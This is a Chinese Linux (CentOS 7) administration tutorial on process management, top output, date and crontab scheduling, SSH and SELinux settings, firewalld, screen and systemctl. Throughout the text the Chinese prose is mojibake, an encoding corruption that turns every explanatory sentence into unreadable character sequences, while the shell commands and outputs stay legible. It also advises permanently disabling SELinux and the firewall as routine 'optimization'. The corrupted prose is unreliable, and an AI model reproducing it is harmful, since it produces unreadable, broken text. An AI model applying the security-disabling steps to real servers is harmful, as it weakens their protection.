å¯ä»¥çœ‹åˆ°ï¼Œç³»ç»Ÿçš„ç¬¬ä¸€ä¸ªè¿›ç¨‹æ˜¯systemdï¼Œç”±ä»–åˆ›å»ºèµ·æ¥äº†å¥½å¤šå…¶ä»–çš„è¿›ç¨‹ï¼Œå¯ä»¥çœ‹åˆ°ä»å±å…³ç³»ï¼š systemdâ”€â”¬â”€NetworkManagerâ”€â”¬â”€dhclient â”‚ â””â”€2*[NetworkManager] â”œâ”€VGAuthService â”œâ”€abrt-watch-log â”œâ”€abrtd â”œâ”€agetty â”œâ”€auditdâ”€â”€â”€auditd â”œâ”€chronyd â”œâ”€crond â”œâ”€dbus-daemonâ”€â”€â”€dbus-daemon â”œâ”€masterâ”€â”¬â”€pickup â”‚ â””â”€qmgr â”œâ”€polkitdâ”€â”€â”€6*[polkitd] â”œâ”€rsyslogdâ”€â”€â”€2*[rsyslogd] â”œâ”€sshdâ”€â”¬â”€sshdâ”€â”€â”€bashâ”€â”€â”€pstree â”‚ â””â”€sshdâ”€â”€â”€bash â”œâ”€systemd-journal â”œâ”€systemd-logind â”œâ”€systemd-udevd â”œâ”€tunedâ”€â”€â”€4*[tuned] â””â”€vmtoolsdâ”€â”€â”€vmtoolsd #å…³é—­è¿›ç¨‹ kill pidå· ä¾‹å­1ï¼š kill 7851 #ä½¿ç”¨è¿›ç¨‹idå·ï¼Œæ¥ç»ˆæ­¢è¿›ç¨‹ kill -9 pidå· #æ…ç”¨ï¼ï¼ï¼#æ‰¹é‡å…³é—­è¿›ç¨‹ï¼Œpkillå…¨ç§°program kill pkill CMDå‘½ä»¤åç§° ä¾‹å­1ï¼š pkill sleep #ä½¿ç”¨è¿›ç¨‹çš„å‘½ä»¤åç§°ï¼Œæ¥ç»ˆæ­¢è¿›ç¨‹ï¼Œä¼šä¸­æ­¢æ‰€æœ‰CMDæ‰§è¡Œç€sleepçš„è¿›ç¨‹çš„ã€‚ pkill -9 sleep # kill -9ï¼Œè¿™ä¸ªå¼ºå¤§å’Œå±é™©çš„å‘½ä»¤è¿«ä½¿è¿›ç¨‹åœ¨è¿è¡Œæ—¶çªç„¶ç»ˆæ­¢ï¼Œè¿›ç¨‹åœ¨ç»“æŸåä¸èƒ½è‡ªæˆ‘æ¸…ç†ã€‚å±å®³æ˜¯å¯¼è‡´ç³»ç»Ÿèµ„æºæ— æ³•æ­£å¸¸é‡Šæ”¾ï¼Œä¸€èˆ¬ä¸æ¨èä½¿ç”¨ï¼Œé™¤éå…¶ä»–åŠæ³•éƒ½æ— æ•ˆã€‚# å¦‚æœæƒ³æŠŠæŸä¸ªè¿œç¨‹è¿æ¥è¸¢ä¸‹çº¿ï¼Œå¯ä»¥æ€æ‰æ˜¾ç¤ºptsçš„è¿œç¨‹è¿æ¥è¿›ç¨‹çš„çˆ¶è¿›ç¨‹ï¼Œå¦‚ä¸‹å›¾ 2.17.2 æŸ¥çœ‹è®¡ç®—æœºç¡¬ä»¶ä¿¡æ¯2-1 æŸ¥çœ‹cpu#æŸ¥çœ‹cpu lscpu 2-2 æŸ¥çœ‹å†…å­˜å‘½ä»¤#æŸ¥çœ‹å†…å­˜å‘½ä»¤ free -h 2-3 æŸ¥çœ‹ç¡¬ç›˜å‘½ä»¤#æŸ¥çœ‹ç¡¬ç›˜å‘½ä»¤ df -h #hè¡¨ç¤ºäººç±»å¯è¯» [root@localhost ~]# df -h æ–‡ä»¶ç³»ç»Ÿ å®¹é‡ å·²ç”¨ å¯ç”¨ å·²ç”¨% æŒ‚è½½ç‚¹ devtmpfs 980M 0 980M 0% /dev tmpfs 991M 0 991M 0% /dev/shm tmpfs 991M 9.5M 981M 1% /run tmpfs 991M 0 991M 0% /sys/fs/cgroup /dev/sda1 100G 2.2G 98G 3% / tmpfs 199M 0 199M 0% /run/user/0 2-4 æŸ¥çœ‹è®¡ç®—æœºçš„cpuï¼Œå†…å­˜ï¼Œè¿›ç¨‹ç­‰ä¿¡æ¯# å«æœ‰tmpçš„è¡¨ç¤ºæ˜¯å†…å­˜ç»™ç¡¬ç›˜çš„ç©ºé—´ï¼Œé»˜è®¤ä¼šç»™1åŠå†…å­˜ç©ºé—´ï¼ŒæŠŠå†…å­˜å½“ä½œç¡¬ç›˜ä½¿ç”¨ï¼Œè¿™ä¸ªæˆ‘ä»¬ä¸ç”¨ç®¡ã€‚# æŸ¥çœ‹è®¡ç®—æœºçš„cpuï¼Œå†…å­˜ï¼Œè¿›ç¨‹ç­‰ä¿¡æ¯(å’Œwindowsçš„ä»»åŠ¡ç®¡ç†å™¨å¾ˆåƒ)top top - 08:34:27 up 20 min, 1 user, load average: 0.00, 0.01, 0.05 Tasks: 89 total, 2 running, 87 sleeping, 0 stopped, 0 zombie %Cpu(s): 0.0 us, 0.0 sy, 0.0 ni,100.0 id, 0.0 wa, 0.0 hi, 0.0 si, 0.0 st KiB Mem : 2027872 total, 1779000 free, 135668 used, 113204 buff/cache KiB Swap: 0 total, 0 free, 0 used. 1755332 avail Mem # ä¸‹é¢æ˜¯è¿›ç¨‹ä¿¡æ¯ï¼Œå€¼å¾—çœ‹çš„æ˜¯æ¯ä¸ªè¿›ç¨‹å ç”¨çš„%CPU %MEMï¼ŒCPUä½¿ç”¨ç‡å’Œå†…å­˜ä½¿ç”¨ç‡ PID USER PR NI VIRT RES SHR S %CPU %MEM TIME+ COMMAND 1 root 20 0 128556 7132 4144 S 0.0 0.4 0:01.27 systemd 2 root 20 0 0 0 0 S 0.0 0.0 0:00.00 kthreadd 4 root 0 -20 0 0 0 S 0.0 0.0 0:00.00 kworker/0:0H# 08:34:27 up 20 minï¼šè¡¨ç¤º08:34:27æ˜¯ç³»ç»Ÿå½“å‰æ—¶é—´ï¼Œå¼€æœºäº†20åˆ†é’Ÿï¼Œå¦‚æœçœ‹åˆ°3:20ï¼Œè¡¨ç¤ºå¼€äº†3å°æ—¶20åˆ†é’Ÿï¼Œçœ‹åˆ°10 daysè¡¨ç¤º10å¤©äº†ï¼Œlinuxå¾ˆç¨³å®šè€ç”¨ï¼Œå¼€æœºå¥½å¤šå¹´éƒ½ç¨³å®šè¿è¡Œç€ï¼Œä¸ä¼šå¡é¡¿ã€‚# 1 user ï¼šè¡¨ç¤ºå½“å‰åªæœ‰ä¸€ä¸ªç”¨æˆ·åœ¨ä½¿ç”¨# load average: 0.00, 0.01, 0.05ï¼šå¹³å‡è´Ÿè·ï¼ŒæŒ‡çš„æ˜¯CPUçš„è´Ÿè½½é«˜ä¸é«˜ï¼ŒCPUè´Ÿè½½é«˜ï¼Œé‚£ä¹ˆå¹³å‡è´Ÿè·å°±æ¯”è¾ƒå¤§ï¼Œå¦‚æœè¿™å‡ ä¸ªå€¼å¾ˆå¤§çš„æ—¶å€™ï¼ŒæœåŠ¡å™¨ä¼šå˜å¾—å¾ˆå¡ã€‚å¦‚æœå‘ç°æœåŠ¡å™¨å¡äº†ï¼Œå°±æ˜¯å¼‚å¸¸æƒ…å†µï¼Œå°±å¯ä»¥çœ‹çœ‹è¿™ä¸ªæ•°æ®ã€‚è¿™ä¸‰ä¸ªå€¼è¡¨ç¤ºï¼š1åˆ†é’Ÿã€5åˆ†é’Ÿã€15åˆ†é’Ÿçš„è´Ÿè½½æƒ…å†µï¼Œload averageæ•°æ®æ˜¯æ¯éš”5ç§’é’Ÿæ£€æŸ¥ä¸€æ¬¡æ´»è·ƒçš„è¿›ç¨‹æ•°ï¼Œç„¶åæŒ‰ç‰¹å®šç®—æ³•è®¡ç®—å‡ºçš„æ•°å€¼ã€‚å¦‚æœè¿™ä¸ªæ•°é™¤ä»¥é€»è¾‘CPUçš„æ•°é‡ï¼Œç»“æœé«˜äº5çš„æ—¶å€™å°±è¡¨æ˜ç³»ç»Ÿåœ¨è¶…è´Ÿè·è¿è½¬äº†ã€‚# Tasks: 89 totalï¼Œ 2 running, 87 sleeping, 0 stopped, 0 zombieï¼šè¡¨ç¤ºè¿›ç¨‹æ•°é‡ï¼Œæ€»å…±89ä¸ªï¼Œ2ä¸ªæ­£åœ¨è¿è¡Œï¼Œ87ä¸ªåœ¨ç¡çœ çŠ¶æ€ï¼Œå½“æˆ‘ä»¬çš„CPUæ˜¯1æ ¸çš„æ—¶å€™ï¼Œæ˜¯åœ¨æ‰€æœ‰è¿›ç¨‹ä¹‹é—´æ¥å›åˆ‡æ¢æ‰§è¡Œï¼Œæ‰€ä»¥åªæœ‰ä¸€ä¸ªæˆ–è€…åˆ‡æ¢é€Ÿåº¦å¾ˆå¿«çš„æ—¶å€™æ˜¾ç¤º2ä¸ªã€‚ 0 stoppedè¡¨ç¤ºåœæ­¢çš„è¿›ç¨‹ï¼Œä½†æ˜¯è¿™é‡Œä¸€èˆ¬éƒ½æ˜¯0ï¼Œä»¥ä¸ºè¿›ç¨‹ç»“æŸä¹‹åä¼šè‡ªåŠ¨ä»å†…å­˜ä¸­é‡Šæ”¾ã€‚0 zombieè¡¨ç¤ºåƒµå°¸è¿›ç¨‹æ•°é‡ï¼Œåƒµå°¸è¿›ç¨‹æ˜¯æ€ä¸æ­»çš„ï¼Œå°±æ˜¯ç”±äºå„ç§åŸå› ï¼Œç³»ç»Ÿæ— æ³•è‡ªåŠ¨é‡Šæ”¾çš„è¿›ç¨‹ï¼Œåƒµå°¸è¿›ç¨‹ä¹Ÿæ¶ˆè€—ç³»ç»Ÿèµ„æºï¼Œä¸€èˆ¬killæ‰å®ƒçš„çˆ¶è¿›ç¨‹å¯ä»¥æ€æ‰åƒµå°¸è¿›ç¨‹ï¼Œæˆ–è€…kill -æ¥æ€æ‰ã€‚ä½†æ˜¯kill -9è¦æ…ç”¨ï¼ï¼ï¼å®ƒä¹Ÿå®¹æ˜“äº§ç”Ÿåƒµå°¸è¿›ç¨‹ï¼Œkillä¼šå°†è¿›ç¨‹è¿è¡Œä¸­çš„ä¿¡æ¯ä¿å­˜ä¸‹æ¥ï¼Œè¿›ç¨‹ä¸ä¼šå‡ºé—®é¢˜ï¼Œkill -9ä¸ä¼šä¿å­˜ï¼Œå¼ºåˆ¶ç»“æŸè¿›ç¨‹çš„è¿è¡Œï¼Œå®¹æ˜“å‡ºç°åƒµå°¸è¿›ç¨‹ã€‚# æŒ‰æ•°å­—1ï¼Œå¯ä»¥æŸ¥çœ‹cpuæ•°é‡# %Cpu(s): 0.0 us, 0.0 sy, 0.0 ni,100.0 id, 0.0 wa, 0.0 hi, 0.0 si, 0.0 ## stï¼Œå…³äºCPUæˆ‘ä»¬å…¶ä»–å‚æ•°ä¸ç”¨çœ‹ï¼Œå°±çœ‹è¿™ä¸ª100.0 idï¼Œidæ˜¯idleçš„ç®€å†™ï¼Œè¡¨ç¤º100%ç©ºé—²ï¼Œå› ä¸ºæˆ‘ä»¬ç°åœ¨ ## CPUä½¿ç”¨ç‡å¾ˆä½ï¼Œæ‰€ä»¥æ˜¾ç¤ºäº†100%ç©ºé—²ã€‚æˆ‘ä»¬åªå…³æ³¨è¿™ä¸ªå‚æ•°å³å¯ï¼Œçœ‹ä¸€ä¸‹CPUå¿™ä¸å¿™å°±è¡Œã€‚# KiB Mem : 2027872 total, 1779000 free, 135668 used, 113204 buff/cacheï¼Œæ˜¯å†…å­˜(è‹±æ–‡ï¼šmemroy)çš„æè¿°ä¿¡æ¯ï¼Œtotalè¡¨ç¤ºæ€»å†…å­˜é‡ï¼Œfreeè¡¨ç¤ºå¯ç”¨å‰©ä½™é‡ï¼Œuserdè¡¨ç¤ºå·²ç»ä½¿ç”¨çš„é‡ï¼Œbuff/cacheè¡¨ç¤ºç”¨ä½œç¼“å­˜ï¼Œæ˜¯å’Œç£ç›˜è¿›è¡Œè¯»å†™æ—¶çš„ç¼“å­˜åŒºåŸŸï¼Œè¿™ä¸ªå‚æ•°ä¸ç”¨ç®¡ã€‚# KiB Swap: 0 total, 0 free, 0 used. 1755332 avail Mem ï¼š## Swapè¡¨ç¤ºè™šæ‹Ÿå†…å­˜ï¼Œè¿™æ˜¯ç¡¬ç›˜åˆ†é…ç»™å†…å­˜çš„ä¸€éƒ¨åˆ†ç©ºé—´ï¼Œä¸ºäº†å½“å†…å­˜ä¸è¶³æ—¶ï¼Œä¸´æ—¶å°†ç¡¬ç›˜å½“ä½œå†…å­˜ä½¿ç”¨ã€‚è¿™ä¸ªæ•°å€¼æ˜¯å¯ä»¥è‡ªè¡Œè°ƒæ•´çš„ã€‚ä¸€èˆ¬è‡ªåŠ¨å°±åˆ†é…å¥½äº†ï¼Œæ‰€ä»¥æˆ‘ä»¬ä¸ç”¨ç®¡ï¼Œå®åœ¨æ˜¯å†…å­˜ä¸å¤Ÿç”¨çš„æ—¶å€™å†åŠ å¤§è¿™ä¸ªè™šæ‹Ÿå†…å­˜ã€‚æˆ‘ç°åœ¨çœ‹çš„æ˜¯è™šæ‹Ÿæœºä¸Šçš„è™šæ‹Ÿå†…å­˜ï¼Œè™šæ‹Ÿæœºä¸è®¾ç½®è™šæ‹Ÿå†…å­˜,æ‰€ä»¥æ˜¾ç¤ºä¸º0ã€‚ swapè™šæ‹Ÿå†…å­˜åœ¨windowsä¹Ÿå†…çœ‹åˆ°ï¼š 2.18 å®šæ—¶ä»»åŠ¡å®šæœŸæ‰§è¡Œä»»åŠ¡ï¼ˆæ‰§è¡Œå‘½ä»¤ï¼‰ï¼Œå’Œwindowsçš„è®¡åˆ’ä»»åŠ¡æ˜¯ä¸€æ ·çš„ã€‚ 2.18.1 æŸ¥çœ‹æ—¶é—´#æ—¶é—´å‘½ä»¤ date#æŸ¥çœ‹æ—¶é—´ [root@localhost ~]# date 2021å¹´ 07æœˆ 23æ—¥ æ˜ŸæœŸäº” 14:38:19 CST[root@localhost ~]# date +%F 2021-07-23[root@localhost ~]# date +%T 14:35:47[root@localhost tmp]# date +%F\\ %T 2022-01-11 10:07:50 2.18.2 ä¿®æ”¹æ—¶é—´å’Œæ—¥æœŸ#ä¿®æ”¹æ—¶é—´å’Œæ—¥æœŸ [root@localhost ~]# date -s 20200723 14:40:00 2020å¹´ 07æœˆ 23æ—¥ æ˜ŸæœŸå›› 14:40:00 CST# ä¿®æ”¹æ—¶é—´ [root@localhost ~]# date -s 14:40:00#åŒæ­¥æ—¶é—´ï¼Œå¦‚æœæ—¶é—´å’Œå½“å‰æ—¶é—´ä¸ä¸€è‡´ï¼Œå¯ä»¥åšä¸€ä¸‹æ—¶é—´åŒæ­¥ï¼Œæ¥è®©æ—¶é—´å‡†ç¡®èµ·æ¥ systemctl restart chronyd # ä¸€æ¬¡æ‰§è¡Œå®Œæ˜¯æœ‰å»¶è¿Ÿçš„ï¼Œç­‰å¾…ä¸€ä¼šæ‰çœ‹åˆ°å‡†ç¡®æ—¶é—´ï¼Œå‰ææ˜¯æˆ‘ä»¬æœ‰ç½‘ 2.18.3 å®šæ—¶ä»»åŠ¡çš„æ ¼å¼#å®šæ—¶ä»»åŠ¡çš„æ ¼å¼ * * * * * cmd åˆ† æ—¶ æ—¥ æœˆ å‘¨ å‘½ä»¤ åˆ†ï¼š0-59 æ—¶ï¼š0-23 æ—¥ï¼š0-31 æœˆï¼š1-12 å‘¨ï¼š1-7#æ¯5åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡ */5 * * * * #æ¯1å°æ—¶çš„01åˆ†æ‰§è¡Œä¸€æ¬¡ 01 */1 * * * #æ¯åŠä¸ªå°æ—¶æ‰§è¡Œä¸€æ¬¡ï¼Œä¸‹é¢çš„æ„æ€æ˜¯æ¯å°æ—¶çš„00åˆ†å’Œ30åˆ†å„æ‰§è¡Œä¸€æ¬¡ 00,30 */1 * * * #æ¯å¤©æ™šä¸Š8:00æ‰§è¡Œä¸€æ¬¡ 00 20 * * * #æ¯ä¸ªæœˆ1å·æ™šä¸Š8:00æ‰§è¡Œ 00 20 1 * * #æ¯å¹´1æœˆ1å·æ™šä¸Š8:00æ‰§è¡Œ 00 20 1 1 * #æ¯å‘¨1ã€å‘¨ä¸‰ã€å‘¨äº”æ™šä¸Š8:00æ‰§è¡Œä¸€æ¬¡ 00 20 * * 1,3,5 # å‡ ä¸ªç¬¦å·çš„æ„æ€ï¼š # * æ¯åˆ†é’Ÿ # */5 æ¯5åˆ†é’Ÿ # 05 ç¬¬5åˆ†é’Ÿ # æ¯ç§’é’Ÿæ‰§è¡Œçš„ä»»åŠ¡ï¼Œéœ€è¦å•ç‹¬å†™è„šæœ¬ï¼Œç¹çä¸€äº›ã€‚ 2.18.4 æŸ¥çœ‹ï¼Œç¼–è¾‘å®šæ—¶ä»»åŠ¡#æŸ¥çœ‹å®šæ—¶ä»»åŠ¡ï¼Œé‡åˆ°ç‰¹æ®Šç¬¦å·%,éœ€è¦æ·»åŠ è½¬ä¹‰ç¬¦å·\\; [root@localhost ~]# crontab -l * * * * * echo `date +\\%T` /tmp/time.txt #ç¼–è¾‘å®šæ—¶ä»»åŠ¡ [root@localhost ~]# crontab -e * * * * * date /tmp/time.txt # æ¯åˆ†é’Ÿæ‰§è¡Œä¸€æ¬¡ [root@localhost ~]# crontab -l * * * * * date /tmp/time.txt## æˆ‘ä»¬å¯ä»¥é€šè¿‡catæ¥æŸ¥çœ‹ä»»åŠ¡æ˜¯å¦æ‰§è¡Œäº†ï¼Œä½†æ˜¯æ¯”è¾ƒéº»çƒ¦ï¼Œæ¯æ¬¡æ‰‹åŠ¨è¾“å…¥catï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨å¦‚ä¸‹æŒ‡ä»¤ tail -f /tmp/time.txt #ç›‘æµ‹æ–‡ä»¶å°¾éƒ¨å†…å®¹çš„å˜åŒ–. [root@localhost ~]# tail -f /tmp/time.txt 2023å¹´ 03æœˆ 24æ—¥ æ˜ŸæœŸäº” 10:58:01 CST 2023å¹´ 03æœˆ 24æ—¥ æ˜ŸæœŸäº” 10:59:01 CST 2023å¹´ 03æœˆ 24æ—¥ æ˜ŸæœŸäº” 11:00:01 CST 2023å¹´ 03æœˆ 24æ—¥ æ˜ŸæœŸäº” 11:01:01 CST # æ˜¯è¿™ä¸ªè¿›ç¨‹å†å¸®æˆ‘ä»¬æ‰§è¡Œå®šæ—¶ä»»åŠ¡ï¼š [root@localhost ~]# ps -ef|grep cron root 581 1 0 18:05 ? 00:00:00 /usr/sbin/crond -n # æˆ‘ä»¬è¿˜å¯ä»¥è‡ªè¡Œé‡å¯è¿™ä¸ªè¿›ç¨‹ root@localhost ~]# systemctl restart crond [root@localhost ~]# ps -ef|grep cron # å¯ä»¥çœ‹åˆ°è¿›ç¨‹å¯åŠ¨æ—¶é—´å˜åŒ–äº† root 2611 1 25 21:27 ? 00:00:00 /usr/sbin/crond -n #æ”¹ä¸ºæ¯å°æ—¶çš„03åˆ†æ‰§è¡Œ [root@localhost ~]# crontab -e [root@localhost ~]# crontab -l 03 * * * * date /tmp/time.txt #ä¿®æ”¹ä¸€ä¸‹ç³»ç»Ÿæ—¶é—´ [root@localhost ~]# date -s 12:02:50 2023å¹´ 03æœˆ 24æ—¥ æ˜ŸæœŸäº” 12:02:50 CST [root@localhost ~]# tail -f /tmp/time.txt ... 2023å¹´ 03æœˆ 24æ—¥ æ˜ŸæœŸäº” 11:13:01 CST 2023å¹´ 03æœˆ 24æ—¥ æ˜ŸæœŸäº” 11:14:01 CST 2023å¹´ 03æœˆ 24æ—¥ æ˜ŸæœŸäº” 12:03:03 CST # 12ç‚¹03åˆ†æ‰§è¡Œçš„ # crontab -eé‡Œé¢æ¯ä¸€è¡Œéƒ½å¯ä»¥å†™ä¸€ä¸ªå®šæ—¶ä»»åŠ¡ï¼Œä¹Ÿå°±æ˜¯å¯ä»¥å†™å¤šä¸ªå®šæ—¶ä»»åŠ¡ã€‚ # æ¯”å¦‚ï¼Œå†åŠ ä¸€ä¸ªçƒ­å†…ï¼šæ¯å¤©æ™šä¸Š9:20è‡ªåŠ¨å…³æœº# 20 21 * * * shutdown -h now[root@localhost ~]# date -s 21:19:50 2023å¹´ 03æœˆ 24æ—¥ æ˜ŸæœŸäº” 21:19:50 CST[root@localhost ~]# crontab -l 03 * * * * date /tmp/time.txt 20 21 * * * shutdown -h now[root@localhost ~]# date 2023å¹´ 03æœˆ 24æ—¥ æ˜ŸæœŸäº” 21:21:03 CST æ‚¨åœ¨ /var/spool/mail/root ä¸­æœ‰é‚®ä»¶# é”™è¯¯çš„åŸå› å¯èƒ½æ˜¯éœ€è¦æˆ‘ä»¬å†™shutdownçš„ç»å¯¹è·¯å¾„[root@localhost ~]# which shutdown # whichä¹Ÿæ˜¯æŸ¥æ‰¾ï¼Œå¯ä»¥æŸ¥æ‰¾æŒ‡ä»¤çš„ç»å¯¹è·¯å¾„ /usr/sbin/shutdown# è¿™é‡Œå°±æ˜¯æƒ³æç¤ºå¤§å®¶ï¼Œå¦‚æœæŒ‡ä»¤ä¸è¡Œï¼Œå°±å†™æŒ‡ä»¤çš„ç»å¯¹è·¯å¾„# æˆ‘ä»¬å‘ç°ï¼Œæ²¡æœ‰å…³é—­æˆåŠŸï¼Œå¹¶ä¸”çœ‹åˆ°äº†ä¸€ä¸ªæç¤ºï¼Œæœ‰ä¸ªé‚®ä»¶ï¼Ÿæˆ‘ä»¬å»çœ‹ä¸€ä¸‹### å¦‚æœå®šæ—¶ä»»åŠ¡çš„æ ¼å¼ï¼Œæˆ–è€…å†…å®¹æœ‰é—®é¢˜ï¼Œç³»ç»Ÿéƒ½ä¼šå‘é‚®ä»¶æç¤ºï¼š 2.19 ç³»ç»Ÿä¼˜åŒ–## ç°åœ¨çš„æ“ä½œç³»ç»Ÿéœ€è¦ä¼˜åŒ–çš„åœ°æ–¹ä¸å¤šäº†ï¼Œç”šè‡³ç›´æ¥å°±å¯ä»¥ä½¿ç”¨ï¼Œä¹‹å‰çš„è€ç³»ç»Ÿéƒ½éœ€è¦å¥½å¤šä¼˜åŒ–æ‰è¡Œã€‚æˆ‘è¿™é‡Œç®€å•åšä¸€äº›ä¼˜åŒ–ï¼Œå¤§å®¶æœ€å¥½å’Œæˆ‘çš„ä¸€è‡´æ˜‚ã€‚æˆ‘ä»¬å…ˆè¿˜åŸä¸€ä¸‹å¿«ç…§ï¼Œä¼˜åŒ–å¥½ä¹‹åæˆ‘ä»¬å†åšä¸€ä¸ªæ–°çš„å¿«ç…§ã€‚ 2.19.1 ä¼˜åŒ–ssh## ä¼˜åŒ–sshï¼Œä»¥é˜²è¿æ¥è¿‡æ…¢ vi /etc/ssh/sshd_config # æ”¹é…ç½®æ–‡ä»¶ä¹‹å‰ï¼Œæœ€å¥½å…ˆåšå¥½å¤‡ä»½ï¼Œcp /etc/ssh/sshd_config /etc/ssh/sshd_config.bak 79è¡Œï¼šGSSAPIAuthentication no 115è¡Œï¼šUseDNS no # åˆ«å¿˜äº†åˆ é™¤å‰é¢çš„æ³¨é‡Šç¬¦å·# systemctl restart sshd 2.19.2 ä¼˜åŒ–selinux#ä¿®æ”¹é…ç½®æ–‡ä»¶ï¼Œæ°¸ä¹…å…³é—­vi /etc/selinux/config#ç¬¬7è¡Œä¿®æ”¹ä¸ºSELINUX=disabledéœ€è¦é‡å¯ç”Ÿæ•ˆ#ç«‹å³ç”Ÿæ•ˆï¼Œä¸´æ—¶çš„ #æœ‰æ—¶å€™æœ‰äº›æœåŠ¡å™¨ä¸è®©é‡å¯ï¼Œå°±å¯ä»¥å…ˆè¿™æ ·ä¸´æ—¶ç”¨ä¸€ä¸‹setenforce 0 2.19.3 å…³é—­firewalldsystemctl stop firewalldsystemctl disable firewalld 2.19.4 å®‰è£…å¸¸ç”¨è½¯ä»¶yum install lrzsz vim tree wget net-tools screen bash-completion tcpdump -ynet-toolsï¼š## ç½‘ç»œç›¸å…³å·¥å…·ï¼Œæ¯”å¦‚ifconfigã€ifconfig ens33(åªçœ‹æŸä¸ªç½‘å¡çš„ip)ï¼Œ## æŸ¥çœ‹å®‰è£…äº†å“ªäº›rpmåŒ…ï¼Œ rpm -qa## å…·ä½“è¿™ä¸ªè½¯ä»¶æœ‰å“ªäº›å‘½ä»¤ rpm -ql net-toolsæ¥æŸ¥çœ‹ã€‚screenï¼š##å±å¹•å·¥å…·ã€‚æˆ‘ä»¬ä»¥åå¯èƒ½è¦è¿œç¨‹è¿æ¥æŸä¸ªæœåŠ¡å™¨ï¼Œæ¯”å¦‚æœåŠ¡å™¨åœ¨å›½å¤–ï¼Œé‚£ä¹ˆæˆ‘ä»¬é€šè¿‡æœ¬åœ°xshellç­‰è¿œç¨‹è¿æ¥åˆ°ç›®æ ‡æœåŠ¡å™¨ï¼Œé‚£ä¹ˆä¸­é—´æœ‰è¦ç»è¿‡å¾ˆå¤šä¸ªç½‘ç»œè®¾å¤‡çš„ä¼ è¾“ï¼Œå¾ˆå®¹æ˜“æ–­æ‰è¿æ¥ï¼Œå¦‚æœæˆ‘ä»¬æ­£åœ¨æ‰§è¡ŒæŸä¸ªç¨‹åºï¼Œçªç„¶æ–­å¼€è¿æ¥äº†ï¼Œé‚£ä¹ˆæˆ‘ä»¬æ‰§è¡Œçš„ç¨‹åºä¹Ÿä¼šè‡ªåŠ¨ä¸­æ–­ï¼Œå¦‚æœæˆ‘ä»¬ä¸æƒ³è®©ç¨‹åºç»ˆç«¯ï¼Œå°±å¯ä»¥ç”¨åˆ°screenå‘½ä»¤äº†ã€‚ [root@localhost ~]# screen # ä¼šå•ç‹¬å†ç»™æˆ‘ä»¬å¼€å¯ä¸€ä¸ªç»ˆç«¯ [root@localhost ~]# sleep 100 # ç„¶åæ¨¡æ‹Ÿä¸€ä¸‹ï¼Œæ–­å¼€è¿æ¥ï¼Œåœ¨é‡æ–°è¿æ¥å›æ¥ï¼Œè¿˜å¯ä»¥é€šè¿‡screenæ¢å¤åˆ°ä¹‹å‰çš„çª—å£çŠ¶æ€ï¼Œå‘ç°ç¨‹åºè¿˜åœ¨ç»§ç»­æ‰§è¡Œç€ã€‚ [root@localhost ~]# screen -ls There is a screen on: 16389.pts-1.localhost (Detached) 1 Socket in /var/run/screen/S-root. [root@localhost ~]# screen -r 16389 # æ¢å¤çª—å£# æ‰€ä»¥å½“ç½‘ç»œä¸ç¨³å®šçš„æ—¶å€™æœ€å¥½ç”¨screenæ¥æ“ä½œã€‚# bash-completionï¼šè¿™ä¸ªè½¯ä»¶å¾ˆç¥å¥‡ï¼Œå«åšè¶…çº§è‡ªåŠ¨è¡¥å…¨ã€‚## è¿™ä¸ªåŒ…å®‰è£…å®Œä¹‹åï¼Œè¦é‡æ–°ç™»å½•ä¸€ä¸‹æ‰è¡Œã€‚# è¿™ä¸ªå·¥å…·æ˜¯tabé”®çš„åŠ å¼ºç‰ˆï¼Œè¾“å…¥-ç„¶åå†ä½¿ç”¨tabçš„æ—¶å€™å¯ä»¥æç¤ºæˆ‘ä»¬æœ‰å“ªäº›å‚æ•°äº†ï¼Œä¹Ÿå°±æ˜¯æç¤ºä¿¡æ¯æ›´å…¨äº†ã€‚ [root@localhost ~]# find /etc/ -size 10k - -amin -ignore_readdir_race -path -anewer -ilname -perm -atime -iname -print# å†æ¯”å¦‚æˆ‘ä»¬æƒ³ä¸‹è½½æŸä¸ªè½¯ä»¶ï¼Œæˆ‘è®°å¾—å¥½åƒæ˜¯psmï¼Œç„¶åä¸€ä¸ªtabé”®å°±è‡ªåŠ¨è¡¥å…¨åŒ…åäº† [root@localhost ~]# yum install ps psacct.x86_64 psmisc.x86_64 psutils-perl.noarch psutils.x86_64 # å…³äºä¼˜åŒ–ï¼Œæˆ‘ä»¬å°±æš‚æ—¶è¯´è¿™ä¹ˆå¤šã€‚[root@localhost ~]# rpm -qa|wc -l # å¯ä»¥æŸ¥çœ‹ä¸€ä¸‹å·²ç»å®‰è£…çš„è½¯ä»¶åŒ…ï¼Œçœ‹çœ‹æ˜¯ä¸æ˜¯484ä¸ªã€‚ 484# ä¼˜åŒ–å¥½ä¹‹åï¼Œå…³æœºåšå¿«ç…§ã€‚# tcpdumpï¼š å…ˆç®€å•çŸ¥é“ä¸€ä¸‹å³å¯ï¼Œåç»­æˆ‘ä»¬è¿˜ä¼šç”¨å®ƒï¼Œåˆ°æ—¶å€™å†è¯¦è§£ # è¿™æ˜¯ä¸ªæŠ“åŒ…æŒ‡ä»¤ï¼Œå¯ä»¥æŠ“å–ç½‘ç»œä¼ è¾“çš„æ•°æ®åŒ…ã€‚ç”¨æˆ·å¯ä»¥å‚è€ƒä¸‹é¢å‡ ä¸ªç½‘å€ï¼š # https://www.bbsmax.com/A/WpdKENY1JV/ # https://www.codenong.com/cs105816177/ # https://blog.csdn.net/yangshengwei230612/article/details/110878714 # åé¢æˆ‘ä»¬ä¼šå­¦ä¹ å…¶ä»–çš„æŠ“åŒ…å·¥å…·ï¼Œæ¯”å¦‚wiresharkã€burp suiteç­‰ç­‰ 2.20 æœåŠ¡ç®¡ç†## æœåŠ¡çš„æ“ä½œï¼šå¼€æœºè‡ªå¯ã€é‡å¯æœåŠ¡ã€å¯åŠ¨æœåŠ¡ã€åœæ­¢æœåŠ¡ç­‰ç­‰ã€‚## å®‰è£…æœåŠ¡ yum install httpd # ç½‘ç«™æœåŠ¡ç¨‹åºï¼Œç±»ä¼¼äºnginxï¼Œå®ƒå«åšapache# systemctl æ˜¯centos7ä¸Šä¸“é—¨ç®¡ç†æœåŠ¡çš„å‘½ä»¤## æŸ¥çœ‹æœåŠ¡æ˜¯å¦è¿è¡Œäº† systemctl status httpd ## æˆ–è€… ps -ef | grep httpd## æŸ¥çœ‹æ‰€æœ‰æœåŠ¡åˆ—è¡¨ systemctl list-unit-files 2.20.1 å¼€æœºè‡ªå¯## æŠŠæœåŠ¡è®¾ç½®ä¸ºå¼€æœºå¯åŠ¨systemctl enable httpd.service## å–æ¶ˆæœåŠ¡çš„å¼€æœºè‡ªå¯systemctl disable 